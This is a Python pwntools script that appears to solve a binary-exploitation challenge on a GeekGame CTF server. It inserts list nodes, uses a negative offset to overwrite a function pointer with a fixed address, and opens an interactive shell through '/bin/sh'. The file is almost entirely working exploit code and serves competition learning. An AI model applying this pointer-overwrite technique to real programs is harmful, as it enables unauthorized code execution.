import pwn
import time

host = 'prob13.geekgame.pku.edu.cn'
port = 10013

conn = pwn.remote(host, port)

token = input("your token = ")

conn.sendline((token + "\n").encode())


def send(b):
    print(f"Sending: {b}")
    conn.send(b)


# 插入第一个节点
print(conn.recvuntil(b'>> \n'))
send(b'\n1\n\n')
print(conn.recvline())
send(b'1\n')
print(conn.recvline())
send(b'16\n')
print(conn.recvline())
send(b'/bin/sh\n')
# 插入第二个节点
print(conn.recvuntil(b'>> \n'))
send(b'\n1\n')
print(conn.recvline())
send(b'2\n')
print(conn.recvline())
send(b'16\n')
print(conn.recvline())
send(b'2222222222222222\n')
# 通过第二个节点覆盖第一个节点的 edit
print(conn.recvuntil(b'>> \n'))
send(b'\n3\n')
print(conn.recvline())
send(b'\n2\n')
print(conn.recvline())
print(conn.recvline())
send(b'-104\n')
print(conn.recvline())
byte_data = pwn.p32(0x004010E0)
send(byte_data)
# 收工
print(conn.recvuntil(b'>> \n'))
send(b'\n3\n')
print(conn.recvline())
send(b'\n1\n')

conn.interactive()

conn.close()
